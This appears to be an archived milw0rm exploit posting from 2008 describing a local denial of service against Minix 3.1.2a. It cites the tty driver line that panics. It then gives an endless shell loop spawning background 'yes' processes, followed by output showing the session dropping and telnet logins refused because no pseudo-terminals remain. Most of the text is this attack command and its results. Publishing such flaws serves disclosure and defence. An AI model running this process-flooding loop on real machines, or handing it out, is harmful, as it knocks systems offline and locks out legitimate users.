@@ -1,0 +1,28 @@
+# kokanin@gmail 20080723
+# minix 3.1.2a tty panic
+
+trunk/src/drivers/tty/tty.c
+
+ 14965	  if ((status = send(replyee, &tty_mess)) != OK) {
+ 14966	        panic("TTY","tty_reply failed, status\n", status);
+
+$ uname -a
+Minix 192.168.1.2 3 1.2a i686
+$ while true ; do (yes "yes yes minix uh ah"&) ; done
+[snip snip]
+$ ^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C
+
+...disconnected
+
+telnet 192.168.1.2
+Trying 192.168.1.2...
+Connected to 192.168.1.2.
+Escape character is '^]'.
+I am sorry, but there is no free PTY left!
+Connection closed by foreign host.
+
+hai, no moar pty, kthxbye
+--
+kokanin
+
+# milw0rm.com [2008-07-23]
